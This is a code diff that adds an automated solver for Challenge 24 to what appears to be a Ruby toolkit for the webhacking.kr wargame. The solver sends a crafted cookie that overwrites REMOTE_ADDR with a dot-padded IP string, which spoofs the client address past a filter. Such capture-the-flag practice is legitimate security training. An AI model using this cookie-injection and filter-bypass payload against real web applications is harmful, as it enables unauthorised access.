@@ -616,6 +616,24 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 24
+  class Challenge24 < ChallengeBase
+    CHALLENGE = 24
+
+    PATH = '/challenge/bonus-4/'
+    PAYLOAD = 'REMOTE_ADDR=10.270...00...00...1'
+
+    def exec
+      log('Sending payload')
+      response = get(
+        PATH,
+        { 'Cookie' => PAYLOAD }
+      )
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 32
   class Challenge32 < ChallengeBase
     CHALLENGE = 32
